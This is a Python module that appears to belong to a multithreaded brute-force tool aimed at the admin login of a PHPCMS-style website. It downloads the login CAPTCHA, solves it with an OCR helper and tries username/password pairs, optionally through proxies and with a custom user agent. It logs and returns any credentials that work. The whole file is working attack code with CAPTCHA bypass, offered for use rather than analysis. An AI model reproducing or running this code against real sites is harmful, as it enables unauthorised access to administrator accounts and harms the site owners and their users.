import requests
import threading
from lib.log import MyLogger
from lib.Identification_vercode import image_str

def save_img(bytes):
    with open("data/vdimgck.png", "wb") as f:
        f.write(bytes)

threadingLock = threading.Lock()
def run(items):
    url,user_agent,proxy,username, password=items
    vdcode = ""
    url=url.strip("/")
    logurl=url+'/index.php?m=admin&c=index&a=login&dosubmit=1'
    header = {'User-Agent': user_agent}

    sesion = requests.session()
    #获取验证码
    try:
        while len(vdcode) < 4:
            if proxy:
                proxies = {
                    "http": "http://%(proxy)s/" % {'proxy': proxy},
                    "https": "http://%(proxy)s/" % {'proxy': proxy}
                }
                bytes_img = sesion.get(url+"/api.php?op=checkcode&code_len=4&font_size=20&width=130&height=50&font_color=&background=", headers=header, proxies=proxies)
            else:
                bytes_img = sesion.get(url+"/api.php?op=checkcode&code_len=4&font_size=20&width=130&height=50&font_color=&background=", headers=header)
            bytes_img=bytes_img.content
            save_img(bytes_img)
            vdcode=image_str("data/vdimgck.png")
    except Exception as error:
        MyLogger.error(error)

    #dosubmit=&username=admin&password=123456&code=2hVY
    data = {
        "dosubmit":'',
        "username": username,
        "password": password,
        "code": vdcode
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = sesion.post(logurl, headers=header, data=data, proxies=proxies)
    else:
        response = sesion.post(logurl, headers=header, data=data)
    if response.status_code == 200 and "验证码输入错误" in response.text:
        MyLogger.warning("验证码判断错误！！")

    threadingLock.acquire()
    print(u'\r[#] 正在尝试凭据：'+username+"    "+password+' '*10,end='')
    # MyLogger.debug("正在尝试凭据："+username+" "+password)
    if response.status_code==200 and "登录成功"in response.text:
        MyLogger.success("有效凭据："+username+" "+password)
        threadingLock.release()
        return {username:password}
    else:
        print(u'\r[#] 无效凭据：' + username + "    " + password+' '*10, end='')
        # MyLogger.debug("无效凭据："+username+" "+password)
        threadingLock.release()





